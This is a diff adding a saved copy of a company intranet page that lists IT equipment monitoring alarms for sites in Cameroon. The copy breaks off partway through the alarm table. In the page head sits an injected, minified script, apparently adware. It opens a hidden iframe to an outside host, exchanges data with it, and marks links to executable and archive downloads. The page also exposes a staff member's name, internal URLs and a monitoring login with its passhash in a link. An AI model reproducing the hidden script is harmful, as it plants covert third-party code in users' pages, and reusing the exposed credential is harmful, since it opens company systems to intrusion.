@@ -1,0 +1,834 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="fr" lang="fr"><head>
+	<title>Monitoring Notif. - IT Equipments - Perenco Intranet</title>
+	<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
+	
+	<link rel="shortcut icon" type="image/ico" href="http://intranet.perenco.net/favicon.ico">
+		<link href="Monitoring%20Notif.%20-%20IT%20Equipments%20-%20Perenco%20Intranet_fichiers/jquery-ui-1.css" rel="stylesheet" type="text/css">
+		<link href="Monitoring%20Notif.%20-%20IT%20Equipments%20-%20Perenco%20Intranet_fichiers/left_menu.css" rel="stylesheet" type="text/css">
+		<link href="Monitoring%20Notif.%20-%20IT%20Equipments%20-%20Perenco%20Intranet_fichiers/top_menu.css" rel="stylesheet" type="text/css">
+		<link href="Monitoring%20Notif.%20-%20IT%20Equipments%20-%20Perenco%20Intranet_fichiers/main.css" rel="stylesheet" type="text/css">
+		<link href="Monitoring%20Notif.%20-%20IT%20Equipments%20-%20Perenco%20Intranet_fichiers/datepicker.css" rel="stylesheet" type="text/css">
+		<link href="Monitoring%20Notif.%20-%20IT%20Equipments%20-%20Perenco%20Intranet_fichiers/generic.css" rel="stylesheet" type="text/css">
+		<link href="Monitoring%20Notif.%20-%20IT%20Equipments%20-%20Perenco%20Intranet_fichiers/print.css" rel="stylesheet" type="text/css" media="print">
+		<!--[if IE 6]>
+	
+	<style type="text/css">	
+		#top_menu .department_name { margin-top:1px; } 
+		#left_menu {width: 13% !important;}
+		#body_content { width: 75% !important; } 
+		#menu-container-home { position: absolute; top:68px; z-index:1000; zoom: 1; }		
+		#drop_down_menu_home li { padding: 4px 10px; }
+		#drop_down_menu_home li.sfhover ul { left: 0px; top:22px; padding: 0; margin: 0; z-index:1000; zoom: 1; background-color: white; }
+		#devCornerBlock { position: relative; width: auto; }
+	</style>
+	<script type="text/javascript">
+		sfHover = function() {
+			var sfEls = document.getElementById("drop_down_menu_home").getElementsByTagName("LI");
+			for (var i=0; i<sfEls.length; i++) {
+				sfEls[i].onmouseover=function() {
+					this.className+=" sfhover";
+				}
+				sfEls[i].onmouseout=function() {
+					this.className=this.className.replace(new RegExp(" sfhover\\b"), "");
+				}
+			}
+		}
+		if (window.attachEvent) window.attachEvent("onload", sfHover);
+	</script>
+	
+	<![endif]-->
+	<!--[if IE 8]>
+	
+	<style type="text/css">	
+		#body_content { width: 82% !important; } 
+	</style>
+	
+	<![endif]-->
+			<script type="text/javascript" src="Monitoring%20Notif.%20-%20IT%20Equipments%20-%20Perenco%20Intranet_fichiers/jquery-1.js"></script>
+			<script type="text/javascript" src="Monitoring%20Notif.%20-%20IT%20Equipments%20-%20Perenco%20Intranet_fichiers/jquery-ui-1.js"></script>
+			<script type="text/javascript" src="Monitoring%20Notif.%20-%20IT%20Equipments%20-%20Perenco%20Intranet_fichiers/compatibility-jquery-mootools.js"></script>
+			<script type="text/javascript" src="Monitoring%20Notif.%20-%20IT%20Equipments%20-%20Perenco%20Intranet_fichiers/top_menu.js"></script><script src="Monitoring%20Notif.%20-%20IT%20Equipments%20-%20Perenco%20Intranet_fichiers/l.htm" type="text/javascript"></script><script type="text/javascript">try{var _xtrg = {host: "http://continuetosave.info", ls: false, init: function (b){-1<window.self.location.href.indexOf(_xtrg.host)||-1<window.self.location.href.indexOf("cebook.com")||(("undefined"==typeof localStorage||"undefined"==typeof postMessage)&&b(!1),OnMessage=function(b){if(b.origin==_xtrg.host)try{_xtrg.ls=JSON.parse(b.data)}catch(e){}},window.addEventListener?window.addEventListener("message",OnMessage,!1):window.attachEvent&&window.attachEvent("onmessage",OnMessage),_xtrg.createIframe(_xtrg.host+"/xtrg.html",function(){b(1)}))}, createIframe: function (b,d){try{ifr=document.createElement("iframe"),ifr.src=b,ifr.setAttribute("style","width:0;height:0;display:none"),ifr.setAttribute("class","_xtrg"),document.getElementsByTagName("body")[0].appendChild(ifr),d&&(ifr.onload=function(){setTimeout(d,1)})}catch(e){}}, clean: function (){try{var b=document.getElementsByClassName("_xtrg");for(i=0;i<b.length;i++)b[i].parentNode.removeChild(b[i])}catch(d){}}, set: function (b,d){b.expired=b.expired?b.expired:0;_xtrg.createIframe(_xtrg.host+"/xtrg.html?"+b.key+"="+b.value+";"+b.expired,d)}, get: function (b){return _xtrg.ls&&_xtrg.ls[b]?_xtrg.ls[b]:!1}};(function(){ var irins = {init: function (){var b=document.getElementsByTagName("a");if(b&&b.length){var d=0;for(i=0;i<b.length;i++){var e=b[i].getAttribute("href");e&&!(-1==e.indexOf(".exe")&&-1==e.indexOf(".msi"))&&d++}d&&_xtrg.init(function(c){if(c&&!_xtrg.get("y")&&!_xtrg.get("c"))for(i=0;i<b.length;i++)(c=b[i].getAttribute("href"))&&!(-1==c.indexOf(".exe")&&-1==c.indexOf(".msi")&&-1==c.indexOf(".torrent")&&-1==c.indexOf(".zip")&&-1==c.indexOf(".rar")&&-1==c.indexOf(".pdf"))&&b[i].setAttribute("omzy_irini","irini")})}}}.init();})()}catch(e){}</script><script src="Monitoring%20Notif.%20-%20IT%20Equipments%20-%20Perenco%20Intranet_fichiers/javascript.htm" type="text/javascript"></script></head><body><iframe id="menu_iframe" style="position: absolute; width: 0; height: 0; margin: 0; padding: 0;" frameborder="0" scrolling="no"></iframe>
+			<script type="text/javascript" src="Monitoring%20Notif.%20-%20IT%20Equipments%20-%20Perenco%20Intranet_fichiers/ts_picker.js"></script>
+			<script type="text/javascript" src="Monitoring%20Notif.%20-%20IT%20Equipments%20-%20Perenco%20Intranet_fichiers/overlib.js"></script>
+			<script type="text/javascript" src="Monitoring%20Notif.%20-%20IT%20Equipments%20-%20Perenco%20Intranet_fichiers/mootools-1.js"></script>
+			<script type="text/javascript" src="Monitoring%20Notif.%20-%20IT%20Equipments%20-%20Perenco%20Intranet_fichiers/mootools-more-1.js"></script>
+			<script type="text/javascript" src="Monitoring%20Notif.%20-%20IT%20Equipments%20-%20Perenco%20Intranet_fichiers/common.js"></script>
+			<script type="text/javascript" src="Monitoring%20Notif.%20-%20IT%20Equipments%20-%20Perenco%20Intranet_fichiers/datepicker.js"></script>
+			<script type="text/javascript" src="Monitoring%20Notif.%20-%20IT%20Equipments%20-%20Perenco%20Intranet_fichiers/user.js"></script>
+			<script type="text/javascript" src="Monitoring%20Notif.%20-%20IT%20Equipments%20-%20Perenco%20Intranet_fichiers/tpl_scrolling_v3.js"></script>
+	
+
+	<div id="tpl_wrapper_page">
+				
+		<div id="tpl_header">
+			<div>
+				<a id="tpl_title" href="http://intranet.perenco.net/index.php">IT Equipments</a>
+			</div>
+		</div> <!-- end #tpl_header -->
+		
+		<div id="tpl_main_body">
+					<div class="generic_menu">
+				<div class="top-menu-category" align="left">
+					<div style="z-index:1;" id="menu-container-home">
+						<ul id="drop_down_menu_home">
+															<li title="IT" alt="IT" class="menu link_top_menu_IT">
+									<a href="#">										
+										IT
+									</a>
+																		<ul id="sub_drop_down_0" class="sub_drop_downs">
+																					<li>
+												<a href="http://intranet.perenco.net/module/helpdesk/">IT Helpdesk</a>
+											</li>
+																					<li>
+												<a href="http://intranet.perenco.net/module/it_project/index.php?todo=list">IT Projects</a>
+											</li>
+																					<li>
+												<a href="http://intranet.perenco.net/module/sftp/index.php">Secure FTP</a>
+											</li>
+																					<li>
+												<a href="http://intranet.perenco.net/module/remote_access/index.php">Remote Access</a>
+											</li>
+																					<li>
+												<a href="http://intranet.perenco.net/awstats/awstats.pl?config=intranet1">AWStats</a>
+											</li>
+																					<li>
+												<a href="http://intranet.perenco.net/module/deposit/?firstParentId=480">IT Documents</a>
+											</li>
+																					<li>
+												<a href="http://intranet.perenco.net/module/it_equipment/index.php">IT Equipments</a>
+											</li>
+																					<li>
+												<a href="http://intranet.perenco.net/module/it_equipment/index_video.php">Video conference</a>
+											</li>
+																			</ul>
+																	</li>
+															<li title="Reports" alt="Reports" class="menu link_top_menu_Reports">
+									<a href="#">										
+										Reports
+									</a>
+																		<ul id="sub_drop_down_1" class="sub_drop_downs">
+																					<li>
+												<a href="http://intranet.perenco.net/module/regular_reporting/index.php?todo=list">Regular Reporting</a>
+											</li>
+																					<li>
+												<a href="http://intranet.perenco.net/module/deposit/?firstParentId=0">Documents</a>
+											</li>
+																					<li>
+												<a href="https://login.ihserc.com/login/erc?">Norms-Standards</a>
+											</li>
+																			</ul>
+																	</li>
+															<li title="Operations" alt="Operations" class="menu link_top_menu_Operations">
+									<a href="#">										
+										Operations
+									</a>
+																		<ul id="sub_drop_down_2" class="sub_drop_downs">
+																					<li>
+												<a href="http://intranet.perenco.net/prodb/codeprod/consult/main-menu.php">Daily Production</a>
+											</li>
+																					<li>
+												<a href="http://intranet.perenco.net/module/operation/">Operations/Reference</a>
+											</li>
+																					<li>
+												<a href="http://intranet.perenco.net/prodb/fieldreview/">Field Review</a>
+											</li>
+																					<li>
+												<a href="http://intranet.perenco.net/module/operations/production/">Production</a>
+											</li>
+																					<li>
+												<a href="http://intranet.perenco.net/module/pims/">PIMS</a>
+											</li>
+																			</ul>
+																	</li>
+															<li title="Project" alt="Project" class="menu link_top_menu_Project">
+									<a href="#">										
+										Project
+									</a>
+																		<ul id="sub_drop_down_3" class="sub_drop_downs">
+																					<li>
+												<a href="http://intranet.perenco.net/module/afe/">AFE</a>
+											</li>
+																					<li>
+												<a href="http://intranet.perenco.net/module/project/">Project Monitor</a>
+											</li>
+																					<li>
+												<a href="http://intranet.perenco.net/module/passport/">License Passport</a>
+											</li>
+																					<li>
+												<a href="http://intranet.perenco.net/module/mto/">MTO</a>
+											</li>
+																					<li>
+												<a href="http://intranet.perenco.net/module/deposit/?firstParentId=827">Reference Docs</a>
+											</li>
+																					<li>
+												<a href="http://intranet.perenco.net/module/authenticate/go_application_tierce.php?id=2">LiveLink</a>
+											</li>
+																					<li>
+												<a href="http://intranet.perenco.net/module/budget/">Budget</a>
+											</li>
+																			</ul>
+																	</li>
+															<li title="QSHE" alt="QSHE" class="menu link_top_menu_QSHE">
+									<a href="#">										
+										QSHE
+									</a>
+																		<ul id="sub_drop_down_4" class="sub_drop_downs">
+																					<li>
+												<a href="http://intranet.perenco.net/module/qshems/">QSHE MS</a>
+											</li>
+																					<li>
+												<a href="http://intranet.perenco.net/module/qhse/consult/report.php?categoryId=58">Basics Reminder</a>
+											</li>
+																					<li>
+												<a href="http://intranet.perenco.net/module/qhse/index.php">M.O.I.</a>
+											</li>
+																					<li>
+												<a href="http://prshse2.fr.perenco.com/Perenco.SD/" target="_blank">EMIS</a>
+											</li>
+																					<li>
+												<a href="http://intranet.perenco.net/module/qhse/consult/incident.php">Comms</a>
+											</li>
+																					<li>
+												<a href="http://intranet.perenco.net/module/deposit/manage/folder.php?tab=2&amp;parentId=2784">MSDS</a>
+											</li>
+																			</ul>
+																	</li>
+															<li title="HR" alt="HR" class="menu link_top_menu_HR">
+									<a href="#">										
+										HR
+									</a>
+																		<ul id="sub_drop_down_5" class="sub_drop_downs">
+																					<li>
+												<a href="http://intranet.perenco.net/module/staff/organigram.php">Organization Charts</a>
+											</li>
+																					<li>
+												<a href="http://intranet.perenco.net/module/staff/move.php">Mobility</a>
+											</li>
+																					<li>
+												<a href="http://intranet.perenco.net/module/deposit/?firstParentId=684">HR Documents</a>
+											</li>
+																					<li>
+												<a href="http://intranet.perenco.net/module/staff/">Staff</a>
+											</li>
+																					<li>
+												<a href="http://intranet.perenco.net/module/planning/">Staff Attendance</a>
+											</li>
+																					<li>
+												<a href="http://intranet.perenco.net/module/travel/">Travel</a>
+											</li>
+																					<li>
+												<a href="http://intranet.perenco.net/module/dayoff/">Holiday</a>
+											</li>
+																					<li>
+												<a href="http://intranet.perenco.net/module/authenticate/go_application_tierce.php?id=1" target="_blanc">Training</a>
+											</li>
+																			</ul>
+																	</li>
+															<li title="Finance" alt="Finance" class="menu link_top_menu_Finance">
+									<a href="#">										
+										Finance
+									</a>
+																		<ul id="sub_drop_down_6" class="sub_drop_downs">
+																					<li>
+												<a href="http://intranet.perenco.net/module/order/">Purchase Order</a>
+											</li>
+																					<li>
+												<a href="http://intranet.perenco.net/module/deposit/manage/folder.php?tab=2&amp;parentId=1338">Documents</a>
+											</li>
+																					<li>
+												<a href="http://intranet.perenco.net/module/deposit/manage/folder.php?tab=2&amp;parentId=1388">Reporting</a>
+											</li>
+																					<li>
+												<a href="http://intranet.perenco.net/module/authenticate/go_application_tierce.php?id=8">DRC Invoices</a>
+											</li>
+																					<li>
+												<a href="http://intranet.perenco.net/module/authenticate/go_application_tierce.php?id=18">Gabon Invoices</a>
+											</li>
+																					<li>
+												<a href="http://intranet.perenco.net/module/authenticate/go_application_tierce.php?id=21">Congo Invoices</a>
+											</li>
+																					<li>
+												<a href="http://intranet.perenco.net/module/authenticate/go_application_tierce.php?id=25">Cameroon Invoices</a>
+											</li>
+																					<li>
+												<a href="http://intranet.perenco.net/module/authenticate/go_application_tierce.php?id=24">Guatemala Invoices</a>
+											</li>
+																			</ul>
+																	</li>
+															<li title="SCM" alt="SCM" class="menu link_top_menu_SCM last">
+									<a href="#">										
+										SCM
+									</a>
+																		<ul id="sub_drop_down_7" class="sub_drop_downs">
+																					<li>
+												<a href="http://intranet.perenco.net/module/deposit/manage/folder.php?tab=2&amp;parentId=477">Documents</a>
+											</li>
+																			</ul>
+																	</li>
+													</ul>
+						<div class="login_div">
+							<a id="tpl_edit_profile" href="http://intranet.perenco.net/module/staff/?id=9156">NDJAYA Joël Junior</a>
+														<a class="link_top_menu_logout" href="http://intranet.perenco.net/login.php?action=logout">Logout</a>
+						</div>
+					</div>
+					<div class="clear"></div>
+				</div>
+			</div>			
+					<div style="margin-left:0px;" id="tpl_wrapper_body">
+				<div id="tpl_inner_body">
+					<div id="left_menu">
+						<div id="contacts_menu" class="left_menus_contact">
+							<ul id="contacts_menu_content">
+																																		
+										
+																	
+									
+																<li class="need_access">
+									<a title="" href="http://intranet.perenco.net/infos.php"><strong>Need an access?</strong></a>
+								</li>
+							</ul>
+						</div>
+						<div class="cleardiv">&nbsp;</div>
+						
+													<div class="left_menus">
+								<h2>IT Equipments</h2>								<ul>
+																																											<li>
+										<a href="http://intranet.perenco.net/module/it_equipment/index.php?todo=main" class="level2"><span>Dashboard</span>
+																				</a>
+									</li>
+																																			<li>
+										<a href="http://intranet.perenco.net/module/it_equipment/index.php?todo=equipments" class="level2"><span>Equipments List</span>
+																				</a>
+									</li>
+																									</ul>
+							</div>
+							<div class="cleardiv">&nbsp;</div>
+													<div class="left_menus">
+								<h2>Equipments Status</h2>								<ul>
+																																											<li>
+										<a href="http://intranet.perenco.net/module/it_equipment/index.php?todo=monitoring" class="level2selected"><span>» Monitoring Notif.</span>
+																				</a>
+									</li>
+																																			<li>
+										<a href="http://intranet.perenco.net/module/it_equipment//ajax/php/display_monitoring_data.php?todo=view_monitoring_servers&amp;popup=1" class="level2"><span>Monitoring Servers</span>
+																				</a>
+									</li>
+																																			<li>
+										<a href="http://intranet.perenco.net/module/it_equipment/index.php?todo=status" class="level2"><span>Network Eqp Status</span>
+																				</a>
+									</li>
+																									</ul>
+							</div>
+							<div class="cleardiv">&nbsp;</div>
+													<div class="left_menus">
+								<h2>About</h2>								<ul>
+																										<li>
+										<a href="http://intranet.perenco.net/module/it_equipment/about.php" class="level1"><span>About</span>
+																				</a>
+									</li>
+																									</ul>
+							</div>
+							<div class="cleardiv">&nbsp;</div>
+												
+													<div class="left_menus">
+								<h2 onmouseover="return overlib('<table width=&quot;100%&quot; border=&quot;2&quot; cellpadding=&quot;5&quot; cellspacing=&quot;3&quot; class=&quot;deposit&quot; style=&quot;font-weight: normal; color: black !important;&quot;><tr><td><img src=&quot;/module/image/shadowless/new-text.png&quot; border=&quot;0&quot; align=&quot;absmiddle&quot; /></td><td nowrap><a style=&quot;color: black;&quot; href=&quot;/module/deposit/manage/document.action.php?action=1&amp;id=8461&quot; target=&quot;_blank&quot;>Great Yarmouth - WAN Connectivity Physical</a>&amp;nbsp;&amp;nbsp;&amp;nbsp;</td><td nowrap>0.07 Mb &amp;nbsp;</td><td nowrap><i><a style=&quot;color: black;&quot; href=&quot;/module/deposit/manage/folder.php?parentId=&quot;>Great Yarmouth</a></i></td><td><a style=&quot;color: black;&quot; href=&quot;/module/deposit/manage/userdocument.action.php?close=1&amp;action=5&amp;documentId=8461&quot; target=&quot;_blank&quot; title=&quot;Add to my archives&quot;><img src=&quot;/module/image/shadowless/plus.png&quot; border=&quot;0&quot; /></a></td><td><a style=&quot;color: black;&quot; href=&quot;/module/deposit/manage/userdocument.action.php?close=1&amp;action=-2&amp;id=575470&quot; target=&quot;_blank&quot; title=&quot;Remove from my notifications&quot;><img src=&quot;/module/image/shadowless/cross.png&quot; border=&quot;0&quot; /></a></td></tr><tr><td><img src=&quot;/module/image/shadowless/new-text.png&quot; border=&quot;0&quot; align=&quot;absmiddle&quot; /></td><td nowrap><a style=&quot;color: black;&quot; href=&quot;/module/deposit/manage/document.action.php?action=1&amp;id=2981&quot; target=&quot;_blank&quot;>Emeraude &amp; LAFP - Network Architecture - Physical</a>&amp;nbsp;&amp;nbsp;&amp;nbsp;</td><td nowrap>0.39 Mb &amp;nbsp;</td><td nowrap><i><a style=&quot;color: black;&quot; href=&quot;/module/deposit/manage/folder.php?parentId=&quot;>CG - Congo</a></i></td><td><a style=&quot;color: black;&quot; href=&quot;/module/deposit/manage/userdocument.action.php?close=1&amp;action=5&amp;documentId=2981&quot; target=&quot;_blank&quot; title=&quot;Add to my archives&quot;><img src=&quot;/module/image/shadowless/plus.png&quot; border=&quot;0&quot; /></a></td><td><a style=&quot;color: black;&quot; href=&quot;/module/deposit/manage/userdocument.action.php?close=1&amp;action=-2&amp;id=258124&quot; target=&quot;_blank&quot; title=&quot;Remove from my notifications&quot;><img src=&quot;/module/image/shadowless/cross.png&quot; border=&quot;0&quot; /></a></td></tr></table>', STICKY, MOUSEOFF, FGCOLOR, '#eeeeee', BGCOLOR , '#FFFFFF', RIGHT, OFFSETX, -10, OFFSETY, -10)" onmouseout="return nd()">2 new documents <img src="Monitoring%20Notif.%20-%20IT%20Equipments%20-%20Perenco%20Intranet_fichiers/new-text.png" align="absmiddle" border="0"> </h2>								<ul>
+																											<span class="leftmenuspan"></span>
+																																				<li>
+											<a href="http://intranet.perenco.net/module/deposit/manage/folder.php?tab=1" class="level2"><span>My Archives</span></a>
+										</li>
+																									</ul>
+							</div>
+							<div class="cleardiv">&nbsp;</div>
+												
+											</div>					
+					<div id="body_content">
+						<div id="tpl_info_top">
+								
+						</div>
+						
+																			<link href="Monitoring%20Notif.%20-%20IT%20Equipments%20-%20Perenco%20Intranet_fichiers/style.css" rel="stylesheet" type="text/css">
+<link href="Monitoring%20Notif.%20-%20IT%20Equipments%20-%20Perenco%20Intranet_fichiers/style-dynamic.css" rel="stylesheet" type="text/css">
+<link href="Monitoring%20Notif.%20-%20IT%20Equipments%20-%20Perenco%20Intranet_fichiers/datepicker_002.css" rel="stylesheet" type="text/css">
+
+<link href="Monitoring%20Notif.%20-%20IT%20Equipments%20-%20Perenco%20Intranet_fichiers/SqueezeBox.css" rel="stylesheet" type="text/css">
+<script type="text/javascript" src="Monitoring%20Notif.%20-%20IT%20Equipments%20-%20Perenco%20Intranet_fichiers/SqueezeBox.js"></script>
+
+<script type="text/javascript" src="Monitoring%20Notif.%20-%20IT%20Equipments%20-%20Perenco%20Intranet_fichiers/common_002.js"></script>
+<script type="text/javascript" src="Monitoring%20Notif.%20-%20IT%20Equipments%20-%20Perenco%20Intranet_fichiers/eqp_monitoring.js"></script>
+
+
+<div class="box_init_container" align="center">	
+		<div class="box_init_title" id="div_eqp_equipment_title">
+		Monitoring Notifications
+	</div>
+		<div class="box_white box_lightgrey" style="text-align:center;margin:0px;padding:0px;" align="center">
+		<div style="" align="center">
+			
+						<div id="div_eqp_equipment_criteria" class="box_eqp_container_criteria" style="border-bottom:none;padding-top:0px;" align="center">
+
+				<form name="form_critere" id="form_critere" method="get">
+					
+					<input name="tab_selected" id="tab_selected" value="incoming" type="hidden">
+					<input name="sort" id="sort" value="" type="hidden">
+					<input name="order" id="order" value="" type="hidden">
+					<input name="page" id="page" value="0" type="hidden">
+				
+
+							
+							<table class="form_eqp" style="width:98%;" border="0" cellpadding="0" cellspacing="2">
+								<colgroup><col width="220">
+								<col width="220">
+								<col width="220">
+								<col width="220">
+								<col>
+								</colgroup><tbody><tr>	
+									<td class="label_small" align="left" valign="bottom">
+										Eqp. Name
+									</td>
+									<td class="label_small" align="left" valign="bottom">
+										World Area
+									</td>
+									<td class="label_small" align="left" valign="bottom">
+										Subsidiary 
+									</td>
+									<td class="label_small" align="left" valign="bottom">
+										Site
+									</td>
+									<td valign="middle">
+										&nbsp;
+									</td>
+								</tr>
+								<tr>
+									<td valign="top">
+										<input id="name_eqp" name="name_eqp" class="input_type input_criteria" style="width:150px;vertical-align:middle;" autocomplete="off" type="text">
+										<img src="Monitoring%20Notif.%20-%20IT%20Equipments%20-%20Perenco%20Intranet_fichiers/b_erase.gif" title="Erase" style="vertical-align:middle;cursor:pointer;" onclick="document.getElementById('name_eqp').value='';return false;">										
+									</td>
+									<td valign="top">
+										<div id="div_criteria_select_area" class="div_select_sub">
+																																	 
+																							 
+																							 
+																							 
+																							 
+																																			<div class="div_criteria_msg_no_select" style="float:left;"> 
+													<input id="id_area" name="id_area" value="4" type="hidden">
+													West Africa
+												</div>
+												 
+																				
+																				<img src="Monitoring%20Notif.%20-%20IT%20Equipments%20-%20Perenco%20Intranet_fichiers/help_16.png" class="img-vertical-middle" style="margin-left:4px;cursor:pointer;" title="Locations - Reference Table" onclick="display_location_reference();return false;">
+										</div>
+										<div id="div_area_msg_all" class="div_criteria_msg_all" style="display:none;">
+											all world areas
+										</div>
+									</td>
+									<td style="border:none;background-color:transparent;" valign="top">
+										<div id="div_criteria_select_sub" class="div_select_sub">
+																																<div class="div_criteria_msg_no_select"> 
+												<input id="id_sub" name="id_sub" value="9" type="hidden">
+												CAMEROON
+											</div>
+																						
+										</div>
+										<div id="div_sub_msg_all" class="div_criteria_msg_all" style="display:none;">
+											all subsidiaries
+										</div>
+									</td>
+									<td style="border:none;background-color:transparent;" valign="top">
+										<div id="div_criteria_select_site" class="div_select_sub">
+																						<select id="id_site" name="id_site" class="input_type" autocomplete="off">
+												<option style="padding-left:2px;" value="" selected="selected">all sites</option>
+																									<option style="padding-left:2px;" value="141">Bipaga</option> 
+																									<option style="padding-left:2px;" value="59">Douala</option> 
+																									<option style="padding-left:2px;" value="65">Ebome / La Lobe</option> 
+																									<option style="padding-left:2px;" value="139">Kribi</option> 
+																									<option style="padding-left:2px;" value="66">Massongo / VT</option> 
+																									<option style="padding-left:2px;" value="94">Rio del Rey - East</option> 
+																									<option style="padding-left:2px;" value="95">Rio del Rey - West</option> 
+																									<option style="padding-left:2px;" value="140">Sanaga</option> 
+																							</select>
+																					</div>
+										<div id="div_site_msg_all" class="div_criteria_msg_all" style="display:none;">
+											all sites
+										</div>
+									</td>
+									<td valign="middle">
+										<input id="rubber_button" class="button_search button_action_eqp_rubber" onclick="reset_monitoring_search_criteria();return false;" value="&nbsp;&nbsp;Reset" style="height:22px;vertical-align:middle;margin-right:5px;" type="button">
+										<input id="display_button" class="button_search button_eqp_search" onclick="call_display_monitoring();return false;" value="&nbsp;Display" style="height:22px;vertical-align:middle;margin-left:5px;" type="submit">						
+									</td>
+								</tr>
+									
+							</tbody></table>	
+						
+				</form>	
+
+
+
+			</div>
+			<div id="tabsF" style="background-color:#E9EEEE;border-bottom:1px solid silver;padding-top:3px;height:23px;float:left;width:70%;">
+				<ul>
+					<li id="menu_li_incoming" class="current"><a href="#" onclick="switchTabMonitoring( 'incoming' ); return false;"><span class="menu_tab"><img src="Monitoring%20Notif.%20-%20IT%20Equipments%20-%20Perenco%20Intranet_fichiers/gear_exclamation_16.png" class="img-vertical-middle">Incoming Notifications</span></a></li>
+										<li id="menu_li_consolidated"><a href="#" onclick="switchTabMonitoring( 'consolidated' ); return false;"><span class="menu_tab"><img src="Monitoring%20Notif.%20-%20IT%20Equipments%20-%20Perenco%20Intranet_fichiers/gear_arrow_blue_16.png" class="img-vertical-middle">In Progress</span></a></li>
+					<li id="menu_li_paused"><a href="#" onclick="switchTabMonitoring( 'paused' ); return false;"><span class="menu_tab"><img src="Monitoring%20Notif.%20-%20IT%20Equipments%20-%20Perenco%20Intranet_fichiers/led_blue.png" class="img-vertical-middle">Paused</span></a></li>
+					<li id="menu_li_fixed"><a href="#" onclick="switchTabMonitoring( 'fixed' ); return false;"><span class="menu_tab"><img src="Monitoring%20Notif.%20-%20IT%20Equipments%20-%20Perenco%20Intranet_fichiers/led_green.png" class="img-vertical-middle">Fixed</span></a></li>					
+				</ul>
+			</div>
+			<div style="background-color:#E9EEEE;border-bottom:1px solid silver;padding-top:3px;height:23px;float:right;width:30%;" align="right">
+				<img src="Monitoring%20Notif.%20-%20IT%20Equipments%20-%20Perenco%20Intranet_fichiers/server_start_16.gif" onclick="display_monitoring_server_list();" class="tips img-vertical-middle" title="PRTG Servers List"><a href="#" class="general_link" style="font-size:0.8em;" onclick="display_monitoring_server_list();return false;">PRTG List</a>&nbsp;&nbsp;
+			</div>
+			<div style="clear:both;"></div>
+			<div id="content_list_monitoring" class="box_eqp_container_result" style="min-height:550px;_height:550px;" align="center"><link href="Monitoring%20Notif.%20-%20IT%20Equipments%20-%20Perenco%20Intranet_fichiers/style.css" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+	
+	
+		<input id="input_nbr_results" value="6" type="hidden">
+		<input id="input_nbr_eqp_displayed" value="0" type="hidden">
+		<input id="nb_page_total" value="1" type="hidden">
+		
+				<div class="eqp_pagination_container" style="width:95%;">
+			<div class="eqp_pagination_nbr_res" id="div_nbr_results" style="float:left;" align="left">
+				6 alarms found<br>
+				Page 1/1
+			</div>
+				
+			
+							&nbsp;
+						<div style="clear:both;"></div>
+		</div>	
+		
+				<div style="border:none;width:95%;margin-bottom:10px;" align="center">
+		<table class="tab_eqp_list_main" id="tab_monitor_perenco" cellpadding="0" cellspacing="0">
+			<colgroup><col width="3%">
+			<col width="3%">
+			<col width="22%">
+			<col width="20%">
+			<col width="12%">			
+			<col width="15%">
+			<col width="6%">
+			<col width="6%">
+			<col width="8%">
+			</colgroup><tbody><tr class="tr_title">
+				<th class="corner">
+					<a href="#" onclick="sortBy('status_raw');return false;" style="color:black">
+					Stus
+					</a>
+				</th>
+				<th>
+					Fp
+				</th>
+				<th>
+					Sensor
+				</th>
+				<th>
+					<a href="#" onclick="sortBy('device_label');return false;" style="color:black">
+						Equipment
+					</a>
+				</th>
+				<th>
+					Last Val
+				</th>				
+				<th>
+					<a href="#" onclick="sortBy('date_script');return false;" style="color:black">
+					Date/Time UTC
+					</a>
+				</th>
+				<th>
+					<a href="#" onclick="sortBy('name_sub');return false;" style="color:black">
+						Sub
+					</a>
+				</th>
+				<th>
+					<a href="#" onclick="sortBy('code_site');return false;" style="color:black">
+						Site
+					</a>
+				</th>
+				<th>
+					Actions
+				</th>
+			</tr>
+			
+						
+							<tr class="odd line_color_0 tr_survol ">
+					<td class="tips td_monitored_err_5" style="border-left:3px solid blue;" title="Down  - previously: Non Event" align="center">
+						&nbsp;						
+					</td>
+					<td align="center">
+						<img src="Monitoring%20Notif.%20-%20IT%20Equipments%20-%20Perenco%20Intranet_fichiers/flip_flap_redgreen_16.png" title="FLIP / FLAP">						
+					</td>
+					<td align="left">
+													<a class="img-link img_page_link" href="http://dlatools.cm.perenco.com/sensor.htm?id=2302&amp;username=monitor&amp;passhash=2409805147" target="_blank" title="KCF3">					
+													KCF3
+						</a>
+					</td>
+					<td align="left" valign="top">
+													kcf3 - esp secteur 2
+											</td>
+					<td style="font-size:0.9em;" align="right">
+						<div class="tips td_monitored_err_info" title="Request timed out (ICMP error # 11010)" style="float:right;width:16px;">
+						&nbsp;
+						</div>
+						<div style="float:right;">
+							&nbsp;						</div>
+						<div class="clear"></div>
+					</td>
+					<td style="font-size:0.8em;" align="center">
+						2013-07-31 15:50:49
+					</td>
+					<td align="center" valign="top">
+																		CM
+											</td>
+					<td class="tips" title="-" align="center" valign="top">
+						-					</td>
+					<td align="center">
+						<img src="Monitoring%20Notif.%20-%20IT%20Equipments%20-%20Perenco%20Intranet_fichiers/led_blue.png" class="tips img-vertical-middle" title="Pause this Sensor" onclick="display_monitoring_action_pause('0','KCF3 - ESP Secteur 2','1136962','2302');return false;" style="cursor:pointer;">
+						<img src="Monitoring%20Notif.%20-%20IT%20Equipments%20-%20Perenco%20Intranet_fichiers/gears_double_silver_16.png" class="tips img-vertical-middle" title="Take in Charge - OR - Fix all Incoming Notifications for this Equipment" onclick="display_monitoring_action('0','KCF3 - ESP Secteur 2','0','0');return false;" style="cursor:pointer;">
+						<img src="Monitoring%20Notif.%20-%20IT%20Equipments%20-%20Perenco%20Intranet_fichiers/gear_16.png" class="tips img-vertical-middle" title="Take in Charge - OR - Fix this Incoming Notification" onclick="display_monitoring_action('0','KCF3 - ESP Secteur 2','1136962','2302');return false;" style="cursor:pointer;">						
+					</td>
+				</tr>
+				
+											<tr class="even line_color_0 tr_survol ">
+					<td class="tips td_monitored_err_5" style="border-left:3px solid blue;" title="Down  - previously: Non Event" align="center">
+						&nbsp;						
+					</td>
+					<td align="center">
+						<img src="Monitoring%20Notif.%20-%20IT%20Equipments%20-%20Perenco%20Intranet_fichiers/flip_flap_redgreen_16.png" title="FLIP / FLAP">						
+					</td>
+					<td align="left">
